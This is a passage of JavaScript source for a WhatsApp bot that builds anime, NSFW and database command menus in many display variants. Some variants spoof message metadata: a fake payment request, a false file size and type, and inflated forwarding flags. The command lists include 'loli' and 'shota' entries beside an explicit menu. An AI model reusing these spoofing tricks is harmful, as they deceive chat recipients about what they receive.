╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Anime* 」❍
│${setv} ${prefix}stickhandhold 🅕
│${setv} ${prefix}stickshinobu 🅕
│${setv} ${prefix}stickcuddle 🅕
│${setv} ${prefix}stickhighfive 🅕
│${setv} ${prefix}stickdance 🅕
│${setv} ${prefix}stickcringe 🅕
│${setv} ${prefix}stickhappy 🅕
│${setv} ${prefix}stickglomp 🅕
│${setv} ${prefix}sticksmug 🅕
│${setv} ${prefix}stickblush 🅕
│${setv} ${prefix}stickawoo 🅕
│${setv} ${prefix}stickwave 🅕
│${setv} ${prefix}sticksmile 🅕
│${setv} ${prefix}stickslap 🅕
│${setv} ${prefix}stickpoke 🅕
│${setv} ${prefix}stickwink 🅕
│${setv} ${prefix}stickbonk 🅕
│${setv} ${prefix}stickbully 🅕
│${setv} ${prefix}stickyeet 🅕
│${setv} ${prefix}stickbike 🅕
│${setv} ${prefix}stickkiss 🅕
│${setv} ${prefix}sticklick 🅕
│${setv} ${prefix}stickpat 🅕
│${setv} ${prefix}stickhug 🅕
│${setv} ${prefix}stickkill 🅕
│${setv} ${prefix}stickcry 🅕
│${setv} ${prefix}stickspank 🅕
│${setv} ${prefix}sticktickle 🅕
│${setv} ${prefix}traceanime 🅕
│${setv} ${prefix}akira 🅕
│${setv} ${prefix}akiyama 🅕
│${setv} ${prefix}ana 🅕
│${setv} ${prefix}asuna 🅕
│${setv} ${prefix}ayuzawa 🅕
│${setv} ${prefix}boruto 🅕
│${setv} ${prefix}chiho 🅕
│${setv} ${prefix}chitoge 🅕
│${setv} ${prefix}cosplayloli 🅕
│${setv} ${prefix}cosplaysagiri 🅕
│${setv} ${prefix}deidara 🅕
│${setv} ${prefix}doraemon 🅕
│${setv} ${prefix}elaina 🅕
│${setv} ${prefix}emilia 🅕
│${setv} ${prefix}erza 🅕
│${setv} ${prefix}gremory 🅕
│${setv} ${prefix}hestia 🅕
│${setv} ${prefix}husbu 🅕
│${setv} ${prefix}inori 🅕
│${setv} ${prefix}isuzu 🅕
│${setv} ${prefix}itachi 🅕
│${setv} ${prefix}itori 🅕
│${setv} ${prefix}kaga 🅕
│${setv} ${prefix}kagura 🅕
│${setv} ${prefix}kakasih 🅕
│${setv} ${prefix}kaori 🅕
│${setv} ${prefix}keneki 🅕
│${setv} ${prefix}kotori 🅕
│${setv} ${prefix}kurumi 🅕
│${setv} ${prefix}loli 🅕
│${setv} ${prefix}loli2 🅕
│${setv} ${prefix}madara 🅕
│${setv} ${prefix}megumin 🅕
│${setv} ${prefix}mikasa 🅕
│${setv} ${prefix}mikey 🅕
│${setv} ${prefix}miku 🅕
│${setv} ${prefix}minato 🅕
│${setv} ${prefix}naruto 🅕
│${setv} ${prefix}neko 🅕
│${setv} ${prefix}nekonime 🅕
│${setv} ${prefix}nezuko 🅕
│${setv} ${prefix}onepiece 🅕
│${setv} ${prefix}pokemon 🅕
│${setv} ${prefix}randomnime 🅕
│${setv} ${prefix}randomnime2 🅕
│${setv} ${prefix}rize 🅕
│${setv} ${prefix}sagiri 🅕
│${setv} ${prefix}sakura 🅕
│${setv} ${prefix}sasuke 🅕
│${setv} ${prefix}shina 🅕
│${setv} ${prefix}shinka 🅕
│${setv} ${prefix}shinomiya 🅕
│${setv} ${prefix}shizuka 🅕
│${setv} ${prefix}shota 🅕
│${setv} ${prefix}tejina 🅕
│${setv} ${prefix}toukachan 🅕
│${setv} ${prefix}tsunade 🅕
│${setv} ${prefix}waifu 🅕
│${setv} ${prefix}waifu2 🅕
│${setv} ${prefix}animewall 🅕
│${setv} ${prefix}yotsuba 🅕
│${setv} ${prefix}yuki 🅕
│${setv} ${prefix}yulibocil 🅕
│${setv} ${prefix}yumeko 🅕
│${setv} ${prefix}8ball 🅕
│${setv} ${prefix}animeawoo 🅕
│${setv} ${prefix}animemegumin 🅕
│${setv} ${prefix}animeshinobu 🅕
│${setv} ${prefix}animehandhold 🅕
│${setv} ${prefix}animehighfive 🅕
│${setv} ${prefix}animecringe 🅕
│${setv} ${prefix}animedance 🅕
│${setv} ${prefix}animehappy 🅕
│${setv} ${prefix}animeglomp 🅕
│${setv} ${prefix}animeblush 🅕
│${setv} ${prefix}animesmug 🅕
│${setv} ${prefix}animewave 🅕
│${setv} ${prefix}animesmille 🅕
│${setv} ${prefix}animepoke 🅕
│${setv} ${prefix}animewink 🅕
│${setv} ${prefix}animebonk 🅕
│${setv} ${prefix}animebully 🅕
│${setv} ${prefix}animeyeet 🅕
│${setv} ${prefix}animebite 🅕
│${setv} ${prefix}animelick 🅕
│${setv} ${prefix}animekill 🅕
│${setv} ${prefix}animecry 🅕
│${setv} ${prefix}animewlp 🅕
│${setv} ${prefix}animekiss 🅕
│${setv} ${prefix}animehug 🅕
│${setv} ${prefix}animeneko 🅕
│${setv} ${prefix}animepat 🅕
│${setv} ${prefix}animeslap 🅕
│${setv} ${prefix}animecuddle 🅕
│${setv} ${prefix}animewaifu 🅕
│${setv} ${prefix}animenom 🅕
│${setv} ${prefix}animefoxgirl 🅕
│${setv} ${prefix}animegecg 🅕
│${setv} ${prefix}animetickle 🅕
│${setv} ${prefix}animefeed 🅕
│${setv} ${prefix}animeavatar 🅕
│${setv} ${prefix}anime 🅕
│${setv} ${prefix}avatar 🅕
│${setv} ${prefix}shinobu 🅕
│${setv} ${prefix}fox_girl 🅕
│${setv} ${prefix}gecg 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'nsfwmenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Anime NSFW* 」❍
│${setv} ${prefix}hentai 🅕
│${setv} ${prefix}gifblowjob 🅕
│${setv} ${prefix}hentaivid 🅕
│${setv} ${prefix}hneko 🅕
│${setv} ${prefix}nwaifu 🅕
│${setv} ${prefix}animespank 🅕
│${setv} ${prefix}trap 🅕
│${setv} ${prefix}blowjob 🅕
│${setv} ${prefix}cuckold 🅕
│${setv} ${prefix}milf 🅕
│${setv} ${prefix}eba 🅕
│${setv} ${prefix}pussy 🅕
│${setv} ${prefix}yuri 🅕
│${setv} ${prefix}zettai 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },              
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 🔖","id":"${prefix}script"}`
              }
                                  ],
                }),
                contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
              }
              })
          }
        },
      }, { quoted: m })
      
      await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
        })
        } else if (typemenu === 'v12') {
        let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xmenu_oh
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": 
`{"title":"قـائـمـة الاوامـر ⚡",
"sections":[{"title":"${ownername}",
"highlight_label":"${botname}",
"rows":[{"header":"ALL MENU",
"title":"click to display",
"description":"Displays The List Of All The Features",
"id":"${prefix}allmenu"}]
}]
}`
              },
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
break
case 'databasemenu': {
let xmenu_oh = `
╭──❍「 *GREETING* 」❍
├ *Hi 👋*
├ *${m.pushName}* 
├ *${xeonytimewisher} 😄* 
╰─┬────❍ ${readmore}
╭─┴❍「 *GUIDE* 」❍
├ *🅞 = For Owner* 
├ *🅕 = For Free User*
├ *🅟 = For Premium User*
╰─┬────❍
╭─┴❍「 *Database* 」❍
│${setv} ${prefix}setcmd 🅞
│${setv} ${prefix}delcmd 🅞
│${setv} ${prefix}listcmd 🅕
│${setv} ${prefix}lockcmd 🅞
│${setv} ${prefix}addmsg 🅞
│${setv} ${prefix}delmsg 🅞
│${setv} ${prefix}getmsg 🅕
│${setv} ${prefix}listmsg 🅕
╰──────❍`
if (typemenu === 'v1') {
                    XeonBotInc.sendMessage(m.chat, {
                        image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    XeonBotInc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.sendMessage(m.chat, {
                        video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, { quoted: m })
                } else if (typemenu === 'v6') {
                    XeonBotInc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, { quoted: m })
                } else if (typemenu === 'v7') {
                    XeonBotInc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	XeonBotInc.sendMessage(m.chat, {
      video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	XeonBotInc.sendMessage(m.chat, {
video: fs.readFileSync('./XeonMedia/theme/Cheems-bot.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363222395675670@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/Wppj16p/cheemspic.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} else if (typemenu === 'v10') {
let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: ownername
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: xmenu_oh,
            subtitle: themeemoji,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                 "name": "cta_url",
                 "buttonParamsJson": "{\"display_text\":\"WhatsApp ☘️\",\"url\":\"https://whatsapp.com/channel/0029VaG9VfPKWEKk1rxTQD20\",\"merchant_url\":\"https://www.google.com\"}"
              },
              {
  "name": "quick_reply",
  "buttonParamsJson": `{"display_text":"Allmenu 🗂️","id":"${prefix}allmenu"}`
   },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Owner 👤","id":"${prefix}owner"}`
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Script 📃","id":"${prefix}script"}`
              }
           ],
          })
        })
    }
  }
}, { quoted: m })

await XeonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
} else if (typemenu === 'v11') {
let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
          message: {
              "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                  text: xmenu_oh
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  text: botname
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                  buttons: [
             {
